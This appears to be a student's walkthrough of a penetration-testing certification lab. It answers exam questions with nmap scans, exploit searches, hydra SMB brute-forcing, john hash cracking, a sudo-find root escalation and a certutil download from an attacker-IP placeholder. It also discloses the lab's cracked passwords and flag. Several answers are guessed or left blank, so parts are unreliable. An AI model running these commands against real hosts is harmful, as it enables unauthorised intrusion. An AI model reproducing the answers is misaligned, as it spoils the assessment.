
## Question No: 01 What is the IP address of the host running WordPress?
- 192.168.100.51
- 192.168.100.54
- 192.168.100.52
- 192.168.100.50

![[Pasted image 20250908150631.png]]

#### Answer: The server running on `192.168.100.50` has hidden wordpress site with VHOST `wordpress.local`

![[Pasted image 20250908153656.png]]

## Question: 2What is the IP address of the host running SAMBA?

- 192.168.100.50
- 192.168.100.52
- 192.168.100.51
- 192.168.100.54

#### Answer: Let's run an NMAP scan to find out.

```bash
┌──(rootkali)-[~]
└─# nmap -p 139,445 -sV target3.local                                              

Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-09 03:07 IST
Nmap scan report for target3.local (192.168.100.52)
Host is up (0.00025s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:2A:A3:96:12:1D (Unknown)
Service Info: Host: IP-192-168-100-52

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds

```

The answer is `192.168.100.52`

## Question: 3How many hosts on the DMZ network are running a web server on port 80?

- 2
- 4
- 5
- 6

## Answer: 4

```bash
nmap -sV -p 80 192.168.100.0/24
```
## Question 04: What version of MySQL is running on the system hosting a Drupal site?

- MySQL 5.5.3
- MySQL 5.5.10
- MySQL 5.5.0
- MySQL 5.5.5
![[Pasted image 20250908175048.png]]

#### Answer: Let's scan the SQL Port of the machine on the Target 3

```bash
root@kali:~# nmap -sV -p 3306 target3.local
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-08 17:52 IST
Nmap scan report for target3.local (192.168.100.52)
Host is up (0.00054s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
MAC Address: 02:2A:A3:96:12:1D (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds

```

The answer is `MySQL 5.5.5`

## Question: 5 What Linux distribution is running on the host running the Drupal site?

![[Pasted image 20250908175303.png]]

#### Answer: After getting the shell by exploiting Drupal RCE vulnerability 

```bash
www-data@ip-192-168-100-52:/home/auditor$ cat /etc/os-release
cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.3 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.3 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

```

The answer is `ubuntu.`


## Question No: 06 What time does a working day start at Syntex?
- 10:00 AM
- 8:00 AM
- 9:00 AM
- 9:30 AM

![[Pasted image 20250908160031.png]]

#### Answer:  8: 00 AM
![[Pasted image 20250908160145.png]]

## Question: 07 What is the email of the admin user on the Drupal site?
- admin@syntexd.com
- admin-user@syntex.com
- admin@syntex.com
- administrator@syntex.com

#### Answer: After logging into the database of drupal and checking out users row in drupal table got the email.

![[Pasted image 20250908195912.png]]


## Question: 08What version of Drupal is running on the Drupal site?

![[Pasted image 20250909015541.png]]

- 7.54
- 7.58
- 7.57
- 7.51

#### Answer:  We need to find config file which holds actual version and upon researching I found it.

![[Pasted image 20250909015635.png]]

The answer is 7.57.

## Question: 9 What is the IP address of the host vulnerable to an SSH brute-force attack?

- 192.168.100.51
- 192.168.100.54
- 192.168.100.50
- 192.168.100.52

#### Answer: `192.168.100.52` because hydra works for long without blocking it.
## Question: 10How many user accounts can be enumerated from the SAMBA server running on the system hosting Drupal?

- 1
- 2
- 3
- 5

#### Answer: Let's run enumeration using Crackmapexec

```bash
*] target3.local:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_enumusers) > smbclient -L //192.168.100.52/ -U dbadmin
[*] exec: smbclient -L //192.168.100.52/ -U dbadmin

Enter WORKGROUP\dbadmin's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shared          Disk      shared
        IPC$            IPC       IPC Service (ip-192-168-100-52 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            
msf6 auxiliary(scanner/smb/smb_enumusers) > smbclient -L //192.168.100.52/ -U ubuntu
[*] exec: smbclient -L //192.168.100.52/ -U ubuntu

Enter WORKGROUP\ubuntu's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shared          Disk      shared
        IPC$            IPC       IPC Service (ip-192-168-100-52 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            
msf6 auxiliary(scanner/smb/smb_enumusers) > smbclient -L //192.168.100.52/ -U auditor
[*] exec: smbclient -L //192.168.100.52/ -U auditor

Enter WORKGROUP\auditor's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shared          Disk      shared
        IPC$            IPC       IPC Service (ip-192-168-100-52 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            


```

The answer is 3.
## Question: 11 What type of vulnerability can be exploited to elevate your privileges on the Linux host running Drupal?

- Locally Stored Credentials
- Misconfigured SUDO Permissions
- Vulnerable Service
- Cron Job

#### Answer: After getting `auditor` shell when I check for sudo priviledges we get

```bash
auditor@ip-192-168-100-52:/var/www/html/drupal$ sudo -l
Matching Defaults entries for auditor on ip-192-168-100-52:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User auditor may run the following commands on ip-192-168-100-52:
    (root) NOPASSWD: /usr/bin/find
```

This means `find` can run with sudo without password. Using payload from GTFO bins I escalated my priviledges.

```bash
auditor@ip-192-168-100-52:/var/www/html/drupal$ sudo find . -exec /bin/sh \; -quit
# /bin/bash
root@ip-192-168-100-52:/var/www/html/drupal# 
```

This means the answer is Misconfigured SUDO Permissions.

## Question: 12 What type of vulnerability can be exploited on the Drupal site?

- RCE
- Shellshock
- Command Injection
- Buffer Overflow

#### Answer: Let's run searchsploit to confirm our drupal version vulnerability.

```bash
┌──(rootkali)-[~]
└─# searchsploit Drupal 7.57
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                      | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                   | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                           | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                       | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                              | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)         | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                            | php/webapps/46459.py
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

The answer is RCE.

## Question: 13 What type of vulnerability can be exploited on the WordPress site to obtain a reverse shell?

- Command Injection
- Arbitrary File Upload
- RCE
- SQL Injection

#### Answer: SQL Injection (Guessed it)

## Question No 15: Which one of the following meterpreter commands can be used to add a network route?

- arp
- autoroute
- route
- netstat

![[Pasted image 20250908160700.png]]

#### Answer: `autoroute`

## Question: 16 One of the Linux servers in the internal network is running a vulnerable service. What port is the vulnerable service running on?
- 22
- 80
- 3389
- 10000

#### Answer:  After NMAP scanning and using searchsploit the port `10000` is running `MiniServ 1.920 (Webmin httpd)` which is vulnerable to RCE

```bash
──(rootkali)-[~/Internal_Targets]
└─# searchsploit  webmin 1.920                                                                                                   130 ⨯

----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Webmin 1.920 - Remote Code Execution                                                                 | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                    | linux/remote/47230.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                        | linux/webapps/47330.rb
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

The answer is 10000.
## Q: 17 What is the password of the user account "dbadmin" on the Linux server hosting Drupal?

- sayang
- qwertyuiop
- syntex6061
- vincenzzo

#### Answer: Let's crack the hash to find out the answer that we got from the mysql database.

```bash
┌──(rootkali)-[~/Target_3]
└─# john --format=drupal7 --wordlist=~/rockyou.txt dbadmin_hash.txt                                                                         1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sayang           (?)     
1g 0:00:00:00 DONE (2025-09-08 20:13) 2.500g/s 300.0p/s 300.0c/s 300.0C/s iloveme..sayang
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

The answer is `sayang`
## Question No 18: What is the password for the user "mike" on WINSERVER-01?

- diamond
- superman
- greenday
- bonita

![[Pasted image 20250908161139.png]]

#### Answer: Let's brute force smb to check the password mike

```bash
root@kali:~# hydra -l mike -P rockyou.txt target1.local smb -t 10
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 16:09:57
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://target1.local:445/
[445][smb] host: target1.local   login: mike   password: diamond
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 16:10:01

```

The answer is `diamond`.

## Question: 19What is the password of the user account "mary" on WINSERVER-03?

#### Answer:  Let's bruteforce smb using username mary and rockyou wordlists.

```bash
──(rootkali)-[~]
└─# hydra -l mary -P rockyou.txt 192.168.100.55 smb -t 10                                                                                   1 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 21:01:30
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.168.100.55:445/
[445][smb] host: 192.168.100.55   login: mary   password: hotmama
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 21:01:51

```

The answer is `hotmama`.

## Question: 20 What host within the DMZ network can be exploited via command injection.

- WINSERVER-03
- WINSERVER-01
- WEBSERVER-02
- WINSERVER-02

The answer is 
## Question: 21 What is the name of the vulnerable web app running on the Linux server in the internal network?

- phpMyAdmin
- Apache Tomcat
- Webmin
- Jenkins

#### Answer: After Scanning the port `10000` of the internal network it is running webmin.

## Question: 22 What web server contains a file called "todo.txt"?

- WINSERVER-02
- WINSERVER-01
- WINSERVER-03
- WEBSERVER-01

#### Answer: Running powershell magic on every target

```powershell
Get-ChildItem -Path C:\ -Recurse -Filter todo.txt -ErrorAction SilentlyContinue
```

This command I used 

![[Pasted image 20250909034613.png]]

The answer is `WINSERVER-03`
## Question: 23What is the password for the "admin" user account on WordPress?

Let's open `phpmyadmin` on the `target1.local` and login with default creds
Common Default Credentials:

- **Username:** `root`
- **Password:** Often empty (blank). This is particularly common when installed as part of a WAMP (Windows, Apache, MySQL, PHP) stack like XAMPP or WampServer, and no password was set during installation.

![[Pasted image 20250909032949.png]]

After searching DB we found the hash for admin

![[Pasted image 20250909033142.png]]

we need to crack this.

```bash
┌──(rootkali)-[~/Target_1]
└─# echo '$P$B.1p.5fiYdFnwttTzSkvT2sl01rlOj0' > wp_hash.txt

                                                                                                                                                                                             
┌──(rootkali)-[~/Target_1]
└─# john --format=phpass --wordlist=~/rockyou.txt wp_hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
estrella         (?)     
1g 0:00:00:00 DONE (2025-09-09 03:32) 33.33g/s 6400p/s 6400c/s 6400C/s 123456..november
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 

```

The answer is `estrella`



## Question: 24 How many plugins are installed on the WordPress site?
- 2
- 3
- 4
- 5

#### Answer: Using the RDP session on target, let's access the plugins directory

![[Pasted image 20250908204157.png]]

The answer is 3.

## Question: 25 What host on the DMZ network is running a database server on port 3307?

- 192.168.100.52
- 192.168.0.100
- 192.168.100.50
- 192.168.100.51

```bash
root@kali:~# nmap -sV -p3307 target1.local
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-09 03:22 IST
Nmap scan report for target1.local (192.168.100.50)
Host is up (0.00028s latency).

PORT     STATE SERVICE         VERSION
3307/tcp open  opsession-prxy?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3307-TCP:V=7.92%I=7%D=9/9%Time=68BF502E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,6B,"g\0\0\x01\xffj\x04Host\x20'ip-192-168-100-5\.ap-south-1\.compute\
SF:.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Ma
SF:riaDB\x20server")%r(giop,6B,"g\0\0\x01\xffj\x04Host\x20'ip-192-168-100-
SF:5\.ap-south-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20conn
SF:ect\x20to\x20this\x20MariaDB\x20server");
MAC Address: 02:27:BE:F6:E1:21 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
```

The answer is `192.168.100.50`
## Question: 26 What version of WordPress is running on WINSERVER-01?
- 5.5.9
- 5.6.1
- 5.9.1
- 5.9.3

#### Answer: Let's find the `version.php` that is located in wordpress site files.

![[Pasted image 20250908204757.png]]

The answer is `5.9.3`
## Question: 27 Excluding the guest account, how many user accounts are present on WINSERVER-01?

- 2
- 3
- 4
- 5

#### Answer: Let's use powershell magic to perform this.

![[Pasted image 20250908194115.png]]

The answer is 4.

## Question: 28What is the root password of the MySQL database on the server running Drupal?

#### Answer: the answer is `syntex0421`

![[Pasted image 20250909134034.png]]

## Question: 29 What host in the DMZ network is running a web server with WebDAV enabled?

- 192.168.100.53
- 192.168.100.52
- 192.168.100.50
- 192.168.100.51

#### Answer: Let's run nmap script to identify this.

```bash
root@kali:~# nmap -p 80 target2.local --script http-webdav-scan
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-09 03:01 IST
Nmap scan report for target2.local (192.168.100.51)
Host is up (0.00023s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Date: Mon, 08 Sep 2025 21:31:25 GMT
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/8.5
|   Directory Listing: 
|     http://target2.local/
|     http://target2.local/aspnet_client/
|     http://target2.local/cmdasp.aspx
|     http://target2.local/iis-85.png
|     http://target2.local/iisstart.htm
|_    http://target2.local/robots.txt.txt
MAC Address: 02:58:1F:43:AC:B9 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds

```

The answer is `192.168.100.51`
## Question: 30Excluding the Administrator, guest and service accounts, how many user accounts are present on WINSERVER-03?

- 1
- 2
- 3
- 4

#### Answer: Let's user powershell magic 

```powershell
(Get-LocalUser | Where-Object { $_.Name -notin @("Administrator","Guest","DefaultAccount","WDAGUtilityAccount") }).Count
```

Using this command we got output 4.

![[Pasted image 20250908210740.png]]

The answer is 4.

## Q: 31/35What is the hashing algorithm used to hash user account passwords on both Linux servers?

- MD4
- SHA-256
- SHA-512
- MD5

#### Answer: SHA-512 is the answer.
## Question: 32 How many HotFixes are installed on WINSERVER-01?

- 200
- 220
- 245
- 256

#### Answer: Running `Get-HotFix | Measure-Object` in powershell in the RDP Session returns 220

![[Pasted image 20250908193520.png]]

## Question 33: A system contains the file `C:\Users\mike\Documents\flag.txt`; what is the value of the flag?

I understand that I only have one attempt at this answer. After clicking _Submit answer_, I will not be able to make edits. Your answer will be graded based on the state of the lab environment at the time it is submitted.

Answer: `f38efc8f44b741c3af0198ade2ac8973`

Submit answer

#### Answer: In the RDP session go to the location told in the question and open the flag using notepad.

![[Pasted image 20250908161903.png]]


## Question: 35 What Windows utility can be used to download files from a remote web server?
- certutil
- netstat
- mshta
- wget

#### Answer: The correct answer is:

👉 **`certutil`**

---

Here’s why:

- **`certutil`** → A built-in Windows utility originally for managing certificates, but attackers and pentesters use it to download files from remote web servers.  
    Example:
    
    ```powershell
    certutil -urlcache -split -f http://<attacker-IP>/file.exe file.exe
    ```
    
- **`netstat`** → Shows active network connections and listening ports.
    
- **`mshta`** → Executes HTA (HTML Applications), can be abused for code execution, but not directly a file downloader.
    
- **`wget`** → Common on Linux, not a native Windows tool (unless you install it separately).
    

---

So in a **Windows pentest/post-exploitation scenario**, the weaponized downloader is **certutil**.

